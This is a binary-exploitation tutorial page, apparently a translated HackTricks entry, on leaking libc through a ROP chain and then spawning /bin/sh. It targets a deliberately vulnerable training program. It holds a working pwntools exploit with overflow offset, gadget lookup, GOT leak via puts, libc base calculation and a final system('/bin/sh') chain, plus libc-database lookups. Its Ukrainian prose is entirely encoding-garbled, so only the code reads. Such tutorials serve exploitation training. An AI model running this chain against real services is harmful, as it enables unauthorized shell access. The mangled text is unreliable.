# –í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ libc –∑ ROP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –®–≤–∏–¥–∫–µ —Ä–µ–∑—é–º–µ

1. **–ó–Ω–∞–π—Ç–∏** –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è **–∑—Å—É–≤**
2. **–ó–Ω–∞–π—Ç–∏** –≥–∞–¥–∂–µ—Ç `POP_RDI`, `PUTS_PLT` —Ç–∞ `MAIN`
3. –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏ –¥–ª—è **–≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å–∏ –ø–∞–º'—è—Ç—ñ** —Ñ—É–Ω–∫—Ü—ñ—ó puts –∞–±–æ —ñ–Ω—à–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó libc —Ç–∞ **–∑–Ω–∞–π—Ç–∏ –≤–µ—Ä—Å—ñ—é libc** ([–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏](https://libc.blukat.me))
4. –ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–æ—é, **–æ–±—á–∏—Å–ª–∏—Ç–∏ ROP —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ**

## –Ü–Ω—à—ñ –Ω–∞–≤—á–∞–ª—å–Ω—ñ –ø–æ—Å—ñ–±–Ω–∏–∫–∏ —Ç–∞ –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏ –¥–ª—è –ø—Ä–∞–∫—Ç–∏–∫–∏

–¶–µ–π –Ω–∞–≤—á–∞–ª—å–Ω–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫ –±—É–¥–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –∫–æ–¥/–±—ñ–Ω–∞—Ä, –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–π —É —Ü—å–æ–º—É –Ω–∞–≤—á–∞–ª—å–Ω–æ–º—É –ø–æ—Å—ñ–±–Ω–∏–∫—É: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
–Ü–Ω—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤—á–∞–ª—å–Ω—ñ –ø–æ—Å—ñ–±–Ω–∏–∫–∏: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## –ö–æ–¥

Filename: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Leaking LIBC template

–Ø –∑–±–∏—Ä–∞—é—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –∫–æ–¥, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π —Ç—É—Ç, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç.\
–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –µ–∫—Å–ø–ª–æ–π—Ç —ñ –ø–æ–º—ñ—Å—Ç—ñ—Ç—å –π–æ–≥–æ –≤ —Ç—É –∂ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é, —â–æ –π –≤—Ä–∞–∑–ª–∏–≤–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —ñ –Ω–∞–¥–∞–π—Ç–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç—É:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∑—Å—É–≤—É

–®–∞–±–ª–æ–Ω –ø–æ—Ç—Ä–µ–±—É—î –∑—Å—É–≤—É –ø–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è–º –µ–∫—Å–ø–ª–æ–π—Ç—É. –Ø–∫—â–æ –±—É–¥—å-—è–∫–∏–π –∑—Å—É–≤ –Ω–∞–¥–∞–Ω–æ, –≤—ñ–Ω –≤–∏–∫–æ–Ω–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ –¥–ª—è –π–æ–≥–æ –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**–í–∏–∫–æ–Ω–∞–π—Ç–µ** `python template.py`, –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è –∫–æ–Ω—Å–æ–ª—å GDB –∑ –ø—Ä–æ–≥—Ä–∞–º–æ—é, —â–æ –∑–∞–∑–Ω–∞–ª–∞ –∑–±–æ—é. –í—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ü—ñ—î—ó **–∫–æ–Ω—Å–æ–ª—ñ GDB** –≤–∏–∫–æ–Ω–∞–π—Ç–µ `x/wx $rsp`, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–±–∞–π—Ç–∏**, —è–∫—ñ –∑–±–∏—Ä–∞–ª–∏—Å—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ RIP. –ù–∞—Ä–µ—à—Ç—ñ, –æ—Ç—Ä–∏–º–∞–π—Ç–µ **–∑—Å—É–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω—Å–æ–ª—ñ **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

–ü—ñ—Å–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∑—Å—É–≤—É (–≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É 40) –∑–º—ñ–Ω—ñ—Ç—å –∑–º—ñ–Ω–Ω—É OFFSET –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —à–∞–±–ª–æ–Ω—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ –∑–Ω–∞—á–µ–Ω–Ω—è.\
`OFFSET = "A" * 40`

–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏: `pattern create 1000` -- _–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ ret_ -- `pattern seach $rsp` –∑ GEF.

## 2- –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –≥–∞–¥–∂–µ—Ç—ñ–≤

–¢–µ–ø–µ—Ä –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ ROP –≥–∞–¥–∂–µ—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É. –¶—ñ ROP –≥–∞–¥–∂–µ—Ç–∏ –±—É–¥—É—Ç—å –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è –≤–∏–∫–ª–∏–∫—É `puts`, —â–æ–± –∑–Ω–∞–π—Ç–∏ **libc**, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è, –∞ –ø—ñ–∑–Ω—ñ—à–µ –¥–ª—è **–∑–∞–ø—É—Å–∫—É —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–ª—è –≤–∏–∫–ª–∏–∫—É **—Ñ—É–Ω–∫—Ü—ñ—ó puts**.\
`MAIN_PLT` –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É **–≥–æ–ª–æ–≤–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó** –ø—ñ—Å–ª—è –æ–¥–Ω–æ–≥–æ –≤–∑–∞—î–º–æ–¥—ñ—ó, —â–æ–± **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏** –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è **–∑–Ω–æ–≤—É** (–±–µ–∑–∫—ñ–Ω–µ—á–Ω—ñ —Ä–∞—É–Ω–¥–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó). **–í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –∫—ñ–Ω—Ü—ñ –∫–æ–∂–Ω–æ–≥–æ ROP –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏**.\
**POP\_RDI** –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–ª—è **–ø–µ—Ä–µ–¥–∞—á—ñ** **–ø–∞—Ä–∞–º–µ—Ç—Ä–∞** –≤–∏–∫–ª–∏–∫–∞–Ω—ñ–π —Ñ—É–Ω–∫—Ü—ñ—ó.

–ù–∞ —Ü—å–æ–º—É –µ—Ç–∞–ø—ñ –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω—ñ—á–æ–≥–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å–µ –±—É–¥–µ –∑–Ω–∞–π–¥–µ–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é pwntools –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

## 3- –ü–æ—à—É–∫ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ libc

–¢–µ–ø–µ—Ä —á–∞—Å –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫–∞ –≤–µ—Ä—Å—ñ—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **libc** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è. –î–ª—è —Ü—å–æ–≥–æ –º–∏ –±—É–¥–µ–º–æ **–≤–∏–∫—Ä–∏–≤–∞—Ç–∏** **–∞–¥—Ä–µ—Å—É** –≤ –ø–∞–º'—è—Ç—ñ **—Ñ—É–Ω–∫—Ü—ñ—ó** `puts`, –∞ –ø–æ—Ç—ñ–º –º–∏ –±—É–¥–µ–º–æ **—à—É–∫–∞—Ç–∏**, –≤ —è–∫—ñ–π **–≤–µ—Ä—Å—ñ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏** –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤–µ—Ä—Å—ñ—è puts –∑–∞ —Ü—ñ—î—é –∞–¥—Ä–µ—Å–æ—é.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
–©–æ–± —Ü–µ –∑—Ä–æ–±–∏—Ç–∏, –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏–º —Ä—è–¥–∫–æ–º –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ –∫–æ–¥—É —î:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
–¶–µ –Ω–∞–¥—ñ—à–ª–µ –∫—ñ–ª—å–∫–∞ –±–∞–π—Ç—ñ–≤, –ø–æ–∫–∏ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞–Ω–Ω—è** **RIP** –Ω–µ —Å—Ç–∞–Ω–µ –º–æ–∂–ª–∏–≤–∏–º: `OFFSET`.\
–ü–æ—Ç—ñ–º –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç—å **–∞–¥—Ä–µ—Å—É** –≥–∞–¥–∂–µ—Ç–∞ `POP_RDI`, —â–æ–± –Ω–∞—Å—Ç—É–ø–Ω–∞ –∞–¥—Ä–µ—Å–∞ (`FUNC_GOT`) –±—É–ª–∞ –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –≤ —Ä–µ–≥—ñ—Å—Ç—Ä—ñ **RDI**. –¶–µ —Ç–æ–º—É, —â–æ –º–∏ —Ö–æ—á–µ–º–æ **–≤–∏–∫–ª–∏–∫–∞—Ç–∏ puts**, **–ø–µ—Ä–µ–¥–∞—é—á–∏** —ó–π **–∞–¥—Ä–µ—Å—É** `PUTS_GOT`, –æ—Å–∫—ñ–ª—å–∫–∏ –∞–¥—Ä–µ—Å–∞ –≤ –ø–∞–º'—è—Ç—ñ —Ñ—É–Ω–∫—Ü—ñ—ó puts –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é, –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î `PUTS_GOT`.\
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ `PUTS_PLT` (–∑ `PUTS_GOT` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **RDI**), —â–æ–± puts **–ø—Ä–æ—á–∏—Ç–∞–ª–∞ –≤–º—ñ—Å—Ç** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `PUTS_GOT` (**–∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó puts –≤ –ø–∞–º'—è—Ç—ñ**) —ñ **–≤–∏–≤–µ–ª–∞ —ó—ó**.\
–ù–∞—Ä–µ—à—Ç—ñ, **–≥–æ–ª–æ–≤–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑–Ω–æ–≤—É**, —â–æ–± –º–∏ –º–æ–≥–ª–∏ –∑–Ω–æ–≤—É –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–∏ **–æ–±–º–∞–Ω—É–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—é puts**, —â–æ–± –≤–æ–Ω–∞ **–≤–∏–≤–µ–ª–∞** **–∞–¥—Ä–µ—Å—É** –≤ **–ø–∞–º'—è—Ç—ñ** —Ñ—É–Ω–∫—Ü—ñ—ó **puts** (—è–∫–∞ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ **libc**). –¢–µ–ø–µ—Ä, –∫–æ–ª–∏ –º–∏ –º–∞—î–º–æ —Ü—é –∞–¥—Ä–µ—Å—É, –º–∏ –º–æ–∂–µ–º–æ **—à—É–∫–∞—Ç–∏, —è–∫–∞ –≤–µ—Ä—Å—ñ—è libc –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è**.

![](<../../../../../.gitbook/assets/image (141).png>)

–û—Å–∫—ñ–ª—å–∫–∏ –º–∏ **–µ–∫—Å–ø–ª—É–∞—Ç—É—î–º–æ** –¥–µ—è–∫–∏–π **–ª–æ–∫–∞–ª—å–Ω–∏–π** –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ** –∑'—è—Å–æ–≤—É–≤–∞—Ç–∏, —è–∫–∞ –≤–µ—Ä—Å—ñ—è **libc** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è (–ø—Ä–æ—Å—Ç–æ –∑–Ω–∞–π–¥—ñ—Ç—å –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –≤ `/lib/x86_64-linux-gnu/libc.so.6`).\
–ê–ª–µ –≤ –≤–∏–ø–∞–¥–∫—É –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –µ–∫—Å–ø–ª–æ—ó—Ç—É —è –ø–æ—è—Å–Ω—é, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ —Ü–µ –∑–Ω–∞–π—Ç–∏:

### 3.1- –ü–æ—à—É–∫ –≤–µ—Ä—Å—ñ—ó libc (1)

–í–∏ –º–æ–∂–µ—Ç–µ —à—É–∫–∞—Ç–∏, —è–∫–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ: [https://libc.blukat.me/](https://libc.blukat.me)\
–¶–µ —Ç–∞–∫–æ–∂ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–∏—è–≤–ª–µ–Ω—É –≤–µ—Ä—Å—ñ—é **libc**

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- –ü–æ—à—É–∫ –≤–µ—Ä—Å—ñ—ó libc (2)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

–¶–µ –∑–∞–π–º–µ –¥–µ—è–∫–∏–π —á–∞—Å, –±—É–¥—å—Ç–µ —Ç–µ—Ä–ø–ª—è—á–∏–º–∏.\
–î–ª—è —Ü—å–æ–≥–æ –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ:

* –Ü–º'—è —Å–∏–º–≤–æ–ª—É libc: `puts`
* –í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ libc: `0x7ff629878690`

–ú–∏ –º–æ–∂–µ–º–æ –∑'—è—Å—É–≤–∞—Ç–∏, —è–∫–∞ **libc** –Ω–∞–π—ñ–º–æ–≤—ñ—Ä–Ω—ñ—à–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
–ú–∏ –æ—Ç—Ä–∏–º—É—î–º–æ 2 –∑–±—ñ–≥–∏ (–≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –¥—Ä—É–≥–µ, —è–∫—â–æ –ø–µ—Ä—à–µ –Ω–µ –ø—Ä–∞—Ü—é—î). –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø–µ—Ä—à–µ:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
–°–∫–æ–ø—ñ—é–π—Ç–µ libc –∑ `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` –¥–æ –Ω–∞—à–æ–≥–æ —Ä–æ–±–æ—á–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É.

### 3.3- –Ü–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è leak
```python
puts
printf
__libc_start_main
read
gets
```
## 4- –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ libc –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–ù–∞ —Ü—å–æ–º—É –µ—Ç–∞–ø—ñ –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–Ω–∞—Ç–∏, —è–∫–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ libc –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è. –û—Å–∫—ñ–ª—å–∫–∏ –º–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—î–º–æ –ª–æ–∫–∞–ª—å–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—é –ø—Ä–æ—Å—Ç–æ: `/lib/x86_64-linux-gnu/libc.so.6`

–û—Ç–∂–µ, –Ω–∞ –ø–æ—á–∞—Ç–∫—É `template.py` –∑–º—ñ–Ω—ñ—Ç—å –∑–º—ñ–Ω–Ω—É **libc** –Ω–∞: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #–í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —à–ª—è—Ö –¥–æ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, –∫–æ–ª–∏ –∑–Ω–∞—î—Ç–µ –π–æ–≥–æ`

–ù–∞–¥–∞–≤—à–∏ **—à–ª—è—Ö** –¥–æ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ libc**, —Ä–µ—à—Ç–∞ **–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –±—É–¥–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ–±—á–∏—Å–ª–µ–Ω–∞**.

–í—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó `get_addr` –±—É–¥–µ –æ–±—á–∏—Å–ª–µ–Ω–æ **–±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–∫—ñ–Ω—Ü–µ–≤–∞ –∞–¥—Ä–µ—Å–∞ –±–∞–∑–∏ libc –ø–æ–≤–∏–Ω–Ω–∞ –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è –Ω–∞ 00**. –Ø–∫—â–æ —Ü–µ –Ω–µ –≤–∞—à –≤–∏–ø–∞–¥–æ–∫, –≤–∏ –º–æ–≥–ª–∏ –≤–∏—Ç–µ–∫—Ç–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É.
{% endhint %}

–¢–æ–¥—ñ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó `system` —Ç–∞ **–∞–¥—Ä–µ—Å–∞** —Ä—è–¥–∫–∞ _"/bin/sh"_ –±—É–¥—É—Ç—å **–æ–±—á–∏—Å–ª–µ–Ω—ñ** –∑ **–±–∞–∑–∏** **libc** —Ç–∞ –Ω–∞–¥–∞–Ω—ñ **–±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ libc.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
–ù–∞—Ä–µ—à—Ç—ñ, –µ–∫—Å–ø–ª–æ–π—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è /bin/sh –±—É–¥–µ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∏–π –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
–î–∞–≤–∞–π—Ç–µ –ø–æ—è—Å–Ω–∏–º–æ —Ü–µ–π —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π ROP.\
–û—Å—Ç–∞–Ω–Ω—ñ–π ROP (`rop1`) –∑–Ω–æ–≤—É –≤–∏–∫–ª–∏–∫–∞–≤ —Ñ—É–Ω–∫—Ü—ñ—é main, —Ç–æ–º—É –º–∏ –º–æ–∂–µ–º–æ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –∑–Ω–æ–≤—É** **–ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è** (–æ—Å—å —á–æ–º—É `OFFSET` —Ç—É—Ç –∑–Ω–æ–≤—É). –ü–æ—Ç—ñ–º –º–∏ —Ö–æ—á–µ–º–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `POP_RDI`, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ **–∞–¥—Ä–µ—Å—É** _"/bin/sh"_ (`BINSH`), —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **system** (`SYSTEM`), –æ—Å–∫—ñ–ª—å–∫–∏ –∞–¥—Ä–µ—Å–∞ _"/bin/sh"_ –±—É–¥–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä.\
–ù–∞—Ä–µ—à—Ç—ñ, **–∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó exit** **–≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è**, —â–æ–± –ø—Ä–æ—Ü–µ—Å **–∫–æ—Ä–µ–∫—Ç–Ω–æ –∑–∞–≤–µ—Ä—à–∏–≤—Å—è** —ñ –Ω–µ –±—É–ª–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ –∂–æ–¥–Ω–∏—Ö —Å–ø–æ–≤—ñ—â–µ–Ω—å.

**–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –µ–∫—Å–ø–ª–æ–π—Ç –≤–∏–∫–æ–Ω–∞—î \_/bin/sh**\_\*\* –æ–±–æ–ª–æ–Ω–∫—É.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ONE\_GADGET

